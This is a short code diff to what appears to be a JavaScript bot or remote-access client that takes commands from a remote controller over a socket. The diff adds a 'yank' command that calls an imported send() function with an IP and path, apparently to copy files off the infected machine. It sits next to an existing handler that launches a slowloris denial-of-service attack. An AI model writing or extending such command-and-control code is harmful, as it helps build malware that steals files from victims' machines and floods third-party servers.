@@ -5,6 +5,7 @@ import process from "process";
 import dotenv from "dotenv";
 import changeDir from "./shell.js";
 import slowLoris from "./attacks/slowloris.js";
+import send from "./send.js" 
 
 dotenv.config({ path: "../config/.env" });
 
@@ -63,12 +64,17 @@ client.on("data", (data) => {
 	}
 
 	if (dataStr.startsWith("slowloris")) {
+		console.log("test")
 		slowLoris(
 			commandArgs.firstArg,
 			commandArgs.secondArg,
 			commandArgs.thirdArg,
 			commandArgs.fourthArg
 		);
+	}
+
+	if (dataStr.startsWith("yank")) {
+		send(IP, commandArgs.secondArg, path, commandArgs.firstArg);
 	}
 });
 
